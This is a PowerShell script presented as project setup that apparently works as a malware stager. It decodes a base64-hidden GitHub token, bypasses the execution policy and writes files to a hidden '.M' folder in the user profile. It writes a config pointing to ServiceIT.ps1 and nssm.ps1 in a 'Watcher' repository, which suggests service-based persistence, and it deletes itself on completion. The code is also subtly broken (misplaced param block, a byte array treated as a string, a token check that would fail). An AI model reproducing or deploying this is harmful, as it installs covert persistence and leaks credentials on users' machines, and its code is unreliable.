# More robust version with error handling
$base64FileContent = "77u/Z2hwX1pDQkMzVXNPQm1BQndPc1VyOHh3NU4yV2dYRW1UYjFNZmVqSw=="
$decodedBytes = [System.Convert]::FromBase64String($base64FileContent)
param(
    [string]$GitHubToken = $decodedBytes
)

try {
    # Set execution policy for current session only
    Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue

    Write-Host "🚀 Starting Project Setup..." -ForegroundColor Cyan

    # Validate token
    if (-not $GitHubToken.StartsWith("github_")) {
        throw "Invalid GitHub token format. Token should start with 'github_'"
    }

    # Create .M directory
    $mDirectory = Join-Path $env:USERPROFILE ".M"
    if (-not (Test-Path $mDirectory)) {
        New-Item -ItemType Directory -Path $mDirectory -Force | Out-Null
        Write-Host "✅ Created directory: $mDirectory" -ForegroundColor Green
    }

    # Create config.json
    $config = @{
        github = @{
            token_file = "token.txt"
            owner = "Darkshadow2019"
            repo = "Watcher"
        }
        downloads = @(
            @{
                github_path = "Tools/ServiceIT.ps1"
                local_path = "C:\Users\$env:USERNAME\.M\ServiceIT.ps1"
            },
            @{
                github_path = "Tools/nssm.ps1"
                local_path = "C:\Users\$env:USERNAME\.M\nssm.ps1"
            }
        )
    }
  

    $configFilePath = Join-Path $mDirectory "config.json"
    $config | ConvertTo-Json -Depth 5 | Out-File -FilePath $configFilePath -Encoding utf8
    Write-Host "✅ Config file created: $configFilePath" -ForegroundColor Green

    # Create token file
    $tokenFilePath = Join-Path $mDirectory "token.txt"
    $GitHubToken | Out-File -FilePath $tokenFilePath -Encoding utf8
    Write-Host "✅ Token file created: $tokenFilePath" -ForegroundColor Green

    # Verification
    Write-Host "`n🔍 Verifying setup..." -ForegroundColor Yellow
    
    $files = @(
        @{Name = "config.json"; Path = $configFilePath}
        @{Name = "en.txt"; Path = $tokenFilePath}
    )

    foreach ($file in $files) {
        if (Test-Path $file.Path) {
            $size = (Get-Item $file.Path).Length
            Write-Host "✅ $($file.Name) - $size bytes" -ForegroundColor Green
        } else {
            Write-Host "❌ $($file.Name) - NOT FOUND" -ForegroundColor Red
        }
    }

    Write-Host "`n🎉 Project setup completed successfully!" -ForegroundColor Green
    Write-Host "📁 Location: $mDirectory" -ForegroundColor Cyan

} catch {
    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}
Start-Sleep -Milliseconds 500
Remove-Item $MyInvocation.MyCommand.Path -Force
